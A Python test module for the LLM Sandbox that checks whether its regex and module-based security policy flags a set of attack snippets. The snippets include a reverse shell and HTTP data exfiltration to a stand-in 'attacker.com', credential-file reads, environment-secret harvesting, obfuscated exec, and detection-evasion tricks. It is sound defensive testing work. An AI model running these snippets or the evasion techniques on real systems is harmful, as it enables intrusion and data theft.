# ruff: noqa: RUF001

"""Advanced security scenarios and attack simulation for LLM Sandbox.

This module contains sophisticated security tests that simulate real-world
attack patterns and edge cases to thoroughly validate the security system.
"""

import logging
import time
from dataclasses import dataclass
from typing import Any

from llm_sandbox import SandboxSession
from llm_sandbox.security import DangerousModule, SecurityIssueSeverity, SecurityPattern, SecurityPolicy

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)


@dataclass
class AttackScenario:
    """Represents an attack scenario for testing."""

    name: str
    description: str
    code: str
    expected_blocked: bool
    attack_type: str
    severity: SecurityIssueSeverity


class AdvancedSecurityTester:
    """Advanced security testing framework."""

    def __init__(self) -> None:
        """Initialize the AdvancedSecurityTester."""
        self.results: list[dict[str, Any]] = []
        self.attack_scenarios = self._create_attack_scenarios()

    def _create_attack_scenarios(self) -> list[AttackScenario]:
        """Create comprehensive attack scenarios."""
        return [
            # Code Injection Attacks
            AttackScenario(
                name="Python Code Injection via eval",
                description="Inject malicious code through eval() function",
                code="""
user_input = "__import__('os').system('whoami')"
result = eval(user_input)
print(result)
""",
                expected_blocked=True,
                attack_type="code_injection",
                severity=SecurityIssueSeverity.HIGH,
            ),
            AttackScenario(
                name="Command Injection via exec",
                description="Execute system commands through exec() function",
                code="""
payload = "import subprocess; subprocess.run(['id'], shell=True)"
exec(payload)
""",
                expected_blocked=True,
                attack_type="code_injection",
                severity=SecurityIssueSeverity.HIGH,
            ),
            # System Command Execution
            AttackScenario(
                name="Direct System Command Execution",
                description="Direct execution of system commands",
                code="""
import os
os.system('cat /etc/passwd')
""",
                expected_blocked=True,
                attack_type="system_command",
                severity=SecurityIssueSeverity.HIGH,
            ),
            AttackScenario(
                name="Subprocess Command Execution",
                description="Execute commands via subprocess module",
                code="""
import subprocess
result = subprocess.run(['ls', '-la', '/'], capture_output=True, text=True)
print(result.stdout)
""",
                expected_blocked=True,
                attack_type="system_command",
                severity=SecurityIssueSeverity.HIGH,
            ),
            # File System Attacks
            AttackScenario(
                name="File System Traversal Attack",
                description="Access files outside intended directory",
                code="""
with open('../../../etc/passwd', 'r') as f:
    content = f.read()
print(content)
""",
                expected_blocked=False,  # Depends on policy - reading might be allowed
                attack_type="file_system",
                severity=SecurityIssueSeverity.MEDIUM,
            ),
            AttackScenario(
                name="Malicious File Writing",
                description="Write malicious content to system files",
                code="""
with open('/tmp/malicious.py', 'w') as f:
    f.write('import os; os.system(\"rm -rf /\")')
""",
                expected_blocked=True,
                attack_type="file_system",
                severity=SecurityIssueSeverity.MEDIUM,
            ),
            AttackScenario(
                name="File Deletion Attack",
                description="Delete critical system files",
                code="""
import os
os.remove('/etc/hosts')
""",
                expected_blocked=True,
                attack_type="file_system",
                severity=SecurityIssueSeverity.HIGH,
            ),
            # Network Attacks
            AttackScenario(
                name="Reverse Shell Creation",
                description="Create a reverse shell connection",
                code="""
import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('attacker.com', 4444))
subprocess.call(['/bin/bash'], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())
""",
                expected_blocked=True,
                attack_type="network",
                severity=SecurityIssueSeverity.HIGH,
            ),
            AttackScenario(
                name="Port Scanning",
                description="Scan for open ports on target systems",
                code="""
import socket
from threading import Thread

def scan_port(host, port):
    try:
        s = socket.socket()
        s.settimeout(1)
        result = s.connect_ex((host, port))
        if result == 0:
            print(f"Port {port} is open")
        s.close()
    except:
        pass

for port in range(20, 100):
    Thread(target=scan_port, args=('127.0.0.1', port)).start()
""",
                expected_blocked=True,
                attack_type="network",
                severity=SecurityIssueSeverity.MEDIUM,
            ),
            # Privilege Escalation
            AttackScenario(
                name="Environment Variable Extraction",
                description="Extract sensitive environment variables",
                code="""
import os
secrets = {}
for key, value in os.environ.items():
    if any(word in key.lower() for word in ['password', 'secret', 'key', 'token']):
        secrets[key] = value
print(secrets)
""",
                expected_blocked=True,
                attack_type="privilege_escalation",
                severity=SecurityIssueSeverity.MEDIUM,
            ),
            # Steganography and Obfuscation
            AttackScenario(
                name="Base64 Encoded Attack",
                description="Hide malicious code using base64 encoding",
                code="""
import base64
encoded = 'aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3dob2FtaScpJw=='
malicious_code = base64.b64decode(encoded).decode()
exec(malicious_code)
""",
                expected_blocked=True,
                attack_type="obfuscation",
                severity=SecurityIssueSeverity.HIGH,
            ),
            AttackScenario(
                name="Dynamic Import Attack",
                description="Use dynamic imports to bypass static analysis",
                code="""
module_name = 'os'
method_name = 'system'
command = 'id'

module = __import__(module_name)
method = getattr(module, method_name)
method(command)
""",
                expected_blocked=True,
                attack_type="obfuscation",
                severity=SecurityIssueSeverity.HIGH,
            ),
            # Data Exfiltration
            AttackScenario(
                name="Data Exfiltration via HTTP",
                description="Exfiltrate sensitive data via HTTP requests",
                code="""
import requests
import os

# Collect system information
data = {
    'hostname': os.uname().nodename,
    'user': os.getenv('USER', 'unknown'),
    'files': os.listdir('/home')
}

# Send to attacker server
requests.post('http://attacker.com/collect', json=data)
""",
                expected_blocked=True,
                attack_type="data_exfiltration",
                severity=SecurityIssueSeverity.MEDIUM,
            ),
            # Process Manipulation
            AttackScenario(
                name="Process Injection",
                description="Inject code into running processes",
                code="""
import ctypes
import ctypes.util

# Load system libraries
libc = ctypes.CDLL(ctypes.util.find_library('c'))

# Attempt to manipulate process memory
libc.ptrace(0, 1234, 0, 0)  # PTRACE_TRACEME on PID 1234
""",
                expected_blocked=True,
                attack_type="process_manipulation",
                severity=SecurityIssueSeverity.HIGH,
            ),
            # Cryptographic Attacks
            AttackScenario(
                name="Weak Cryptography Usage",
                description="Use weak cryptographic algorithms",
                code="""
import hashlib
import os

# Use weak MD5 for password hashing
password = 'user_password'
salt = os.urandom(16)
weak_hash = hashlib.md5(password.encode() + salt).hexdigest()
print(f'Weak hash: {weak_hash}')
""",
                expected_blocked=False,  # Might be allowed but flagged
                attack_type="cryptography",
                severity=SecurityIssueSeverity.LOW,
            ),
            # Advanced Evasion Techniques
            AttackScenario(
                name="String Concatenation Evasion",
                description="Evade pattern matching using string manipulation",
                code="""
# Split dangerous function names to evade detection
mod_name = 'o' + 's'
func_name = 'sys' + 'tem'
command = 'who' + 'ami'

module = __import__(mod_name)
func = getattr(module, func_name)
func(command)
""",
                expected_blocked=True,
                attack_type="evasion",
                severity=SecurityIssueSeverity.HIGH,
            ),
            AttackScenario(
                name="Reflection-based Attack",
                description="Use reflection to access dangerous functions",
                code="""
# Use reflection to bypass static analysis
builtins_dict = __builtins__ if isinstance(__builtins__, dict) else __builtins__.__dict__
eval_func = builtins_dict['eval']
eval_func('__import__("os").system("id")')
""",
                expected_blocked=True,
                attack_type="evasion",
                severity=SecurityIssueSeverity.HIGH,
            ),
        ]

    def create_comprehensive_security_policy(self) -> SecurityPolicy:
        """Create a comprehensive security policy for testing."""
        patterns = [
            # System commands
            SecurityPattern(
                pattern=r"\bos\.system\s*\(",
                description="Direct system command execution",
                severity=SecurityIssueSeverity.HIGH,
            ),
            SecurityPattern(
                pattern=r"\bsubprocess\.(run|call|Popen|check_output)\s*\(",
                description="Subprocess execution",
                severity=SecurityIssueSeverity.HIGH,
            ),
            # Dynamic code execution
            SecurityPattern(
                pattern=r"\beval\s*\(",
                description="Dynamic code evaluation",
                severity=SecurityIssueSeverity.HIGH,
            ),
            SecurityPattern(
                pattern=r"\bexec\s*\(",
                description="Dynamic code execution",
                severity=SecurityIssueSeverity.HIGH,
            ),
            # File operations
            SecurityPattern(
                pattern=r"\bopen\s*\([^)]*['\"][wa]['\"][^)]*\)",
                description="File write operations",
                severity=SecurityIssueSeverity.MEDIUM,
            ),
            SecurityPattern(
                pattern=r"\bos\.(remove|unlink|rmdir)\s*\(",
                description="File deletion operations",
                severity=SecurityIssueSeverity.HIGH,
            ),
            # Network operations
            SecurityPattern(
                pattern=r"\bsocket\.socket\s*\(",
                description="Socket creation",
                severity=SecurityIssueSeverity.MEDIUM,
            ),
            SecurityPattern(
                pattern=r"\b\w+\.connect\s*\(",
                description="Network connections",
                severity=SecurityIssueSeverity.MEDIUM,
            ),
            # Dynamic imports and attribute access
            SecurityPattern(
                pattern=r"\b__import__\s*\(",
                description="Dynamic module imports",
                severity=SecurityIssueSeverity.MEDIUM,
            ),
            SecurityPattern(
                pattern=r"\bgetattr\s*\(",
                description="Dynamic attribute access",
                severity=SecurityIssueSeverity.LOW,
            ),
            # Environment access
            SecurityPattern(
                pattern=r"\bos\.environ",
                description="Environment variable access",
                severity=SecurityIssueSeverity.LOW,
            ),
            # Encoding/obfuscation
            SecurityPattern(
                pattern=r"\bbase64\.b64decode\s*\(",
                description="Base64 decoding (potential obfuscation)",
                severity=SecurityIssueSeverity.LOW,
            ),
        ]

        dangerous_modules = [
            DangerousModule(
                name="os",
                description="Operating system interface",
                severity=SecurityIssueSeverity.HIGH,
            ),
            DangerousModule(
                name="subprocess",
                description="Subprocess management",
                severity=SecurityIssueSeverity.HIGH,
            ),
            DangerousModule(
                name="ctypes",
                description="Foreign function library",
                severity=SecurityIssueSeverity.HIGH,
            ),
            DangerousModule(
                name="socket",
                description="Network socket operations",
                severity=SecurityIssueSeverity.MEDIUM,
            ),
            DangerousModule(
                name="requests",
                description="HTTP requests library",
                severity=SecurityIssueSeverity.MEDIUM,
            ),
        ]

        return SecurityPolicy(
            safety_level=SecurityIssueSeverity.LOW,
            patterns=patterns,
            dangerous_modules=dangerous_modules,
        )

    def run_attack_simulation(self) -> dict[str, Any]:
        """Run comprehensive attack simulation."""
        logger.info("🔥 Starting Advanced Security Attack Simulation")
        logger.info("=" * 60)

        policy = self.create_comprehensive_security_policy()
        results: dict[str, Any] = {
            "total_scenarios": len(self.attack_scenarios),
            "blocked_correctly": 0,
            "allowed_correctly": 0,
            "false_positives": 0,
            "false_negatives": 0,
            "by_attack_type": {},
            "detailed_results": [],
        }

        with SandboxSession(lang="python", security_policy=policy, verbose=False) as session:
            for scenario in self.attack_scenarios:
                logger.info("\n🎯 Testing: %s", scenario.name)
                logger.info("   Type: %s", scenario.attack_type)
                logger.info("   Expected: %s", "BLOCKED" if scenario.expected_blocked else "ALLOWED")

                start_time = time.time()
                is_safe, violations = session.is_safe(scenario.code)
                analysis_time = time.time() - start_time

                actual_blocked = not is_safe
                correct_prediction = actual_blocked == scenario.expected_blocked

                if correct_prediction:
                    if scenario.expected_blocked:
                        results["blocked_correctly"] += 1
                        status = "✅ CORRECTLY BLOCKED"
                    else:
                        results["allowed_correctly"] += 1
                        status = "✅ CORRECTLY ALLOWED"
                elif scenario.expected_blocked and not actual_blocked:
                    results["false_negatives"] += 1
                    status = "❌ FALSE NEGATIVE (Should be blocked but allowed)"
                else:
                    results["false_positives"] += 1
                    status = "❌ FALSE POSITIVE (Should be allowed but blocked)"

                logger.info("   Result: %s", status)
                logger.info("   Analysis Time: %.4fs", analysis_time)

                if violations:
                    logger.info("   Violations (%s):", len(violations))
                    for violation in violations[:3]:  # Show first 3
                        logger.info("     - %s (%s)", violation.description, violation.severity.name)

                # Track by attack type
                attack_type = scenario.attack_type
                if attack_type not in results["by_attack_type"]:
                    results["by_attack_type"][attack_type] = {"total": 0, "correct": 0, "false_pos": 0, "false_neg": 0}

                results["by_attack_type"][attack_type]["total"] += 1
                if correct_prediction:
                    results["by_attack_type"][attack_type]["correct"] += 1
                elif actual_blocked and not scenario.expected_blocked:
                    results["by_attack_type"][attack_type]["false_pos"] += 1
                else:
                    results["by_attack_type"][attack_type]["false_neg"] += 1

                # Store detailed result
                results["detailed_results"].append({
                    "scenario": scenario.name,
                    "attack_type": scenario.attack_type,
                    "expected_blocked": scenario.expected_blocked,
                    "actual_blocked": actual_blocked,
                    "correct": correct_prediction,
                    "analysis_time": analysis_time,
                    "violations": len(violations),
                })

        return results

    def generate_security_report(self, results: dict[str, Any]) -> None:
        """Generate comprehensive security test report."""
        logger.info("\n%s", "=" * 60)
        logger.info("🛡️  ADVANCED SECURITY TEST REPORT")
        logger.info("=" * 60)

        total = results["total_scenarios"]
        correct = results["blocked_correctly"] + results["allowed_correctly"]
        accuracy = (correct / total) * 100 if total > 0 else 0

        logger.info("\n📊 Overall Statistics:")
        logger.info("   Total Scenarios: %s", total)
        logger.info("   Correctly Blocked: %s", results["blocked_correctly"])
        logger.info("   Correctly Allowed: %s", results["allowed_correctly"])
        logger.info("   False Positives: %s", results["false_positives"])
        logger.info("   False Negatives: %s", results["false_negatives"])
        logger.info("   Overall Accuracy: %.1f%%", accuracy)

        logger.info("\n🎯 Results by Attack Type:")
        for attack_type, stats in results["by_attack_type"].items():
            type_accuracy = (stats["correct"] / stats["total"]) * 100 if stats["total"] > 0 else 0
            logger.info("   %s:", attack_type.replace("_", " ").title())
            logger.info("     Total: %s, Correct: %s", stats["total"], stats["correct"])
            logger.info("     False Pos: %s, False Neg: %s", stats["false_pos"], stats["false_neg"])
            logger.info("     Accuracy: %.1f%%", type_accuracy)

        # Performance analysis
        analysis_times = [r["analysis_time"] for r in results["detailed_results"]]
        if analysis_times:
            avg_time = sum(analysis_times) / len(analysis_times)
            max_time = max(analysis_times)
            logger.info("\n⚡ Performance:")
            logger.info("   Average Analysis Time: %.4fs", avg_time)
            logger.info("   Maximum Analysis Time: %.4fs", max_time)

        # Security effectiveness
        high_risk_scenarios = [
            r
            for r in results["detailed_results"]
            if any(s.name == r["scenario"] and s.severity == SecurityIssueSeverity.HIGH for s in self.attack_scenarios)
        ]
        high_risk_blocked = sum(1 for r in high_risk_scenarios if r["actual_blocked"])

        if high_risk_scenarios:
            high_risk_effectiveness = (high_risk_blocked / len(high_risk_scenarios)) * 100
            logger.info("\n🚨 High-Risk Attack Protection:")
            logger.info("   High-Risk Scenarios: %s", len(high_risk_scenarios))
            logger.info("   Successfully Blocked: %s", high_risk_blocked)
            logger.info("   Protection Rate: %.1f%%", high_risk_effectiveness)

    def run_evasion_technique_tests(self) -> None:
        """Test advanced evasion techniques."""
        logger.info("\n🥷 Testing Advanced Evasion Techniques")
        logger.info("=" * 50)

        evasion_tests = [
            {
                "name": "Unicode Obfuscation",
                "code": """
# Using unicode characters to obfuscate
import 𝐨𝐬
𝐨𝐬.system('whoami')
""",
                "expected_blocked": False,  # Might not be caught by simple regex
            },
            {
                "name": "Comment Injection",
                "code": """
import os
# This is a comment with os.system('safe') that shouldn't trigger
os.system('actual_command')
""",
                "expected_blocked": True,
            },
            {
                "name": "Multi-line String Literal",
                "code": '''
malicious_code = """
import os
os.system('id')
"""
exec(malicious_code)
''',
                "expected_blocked": True,
            },
            {
                "name": "Function Pointer Indirection",
                "code": """
import os
func = os.system
func('whoami')
""",
                "expected_blocked": True,  # Should be caught by os.system pattern
            },
        ]

        policy = self.create_comprehensive_security_policy()

        with SandboxSession(lang="python", security_policy=policy, verbose=False) as session:
            for test in evasion_tests:
                is_safe, violations = session.is_safe(str(test["code"]))
                actual_blocked = not is_safe

                status = "✅ DETECTED" if actual_blocked else "❌ EVADED"
                logger.info("   %s: %s", test["name"], status)

                if violations:
                    logger.info("     Violations: %s", len(violations))
                    for violation in violations[:2]:
                        logger.info("       - %s", violation.description)


def run_advanced_security_tests() -> None:
    """Run comprehensive advanced security tests."""
    tester = AdvancedSecurityTester()

    try:
        # Run main attack simulation
        results = tester.run_attack_simulation()
        tester.generate_security_report(results)

        # Run evasion technique tests
        tester.run_evasion_technique_tests()

        logger.info("\n🎉 Advanced security testing completed successfully!")

    except Exception:
        logger.exception("Advanced security testing failed")
        raise


if __name__ == "__main__":
    logger.info("LLM Sandbox Advanced Security Scenarios")
    logger.info("=======================================")

    run_advanced_security_tests()
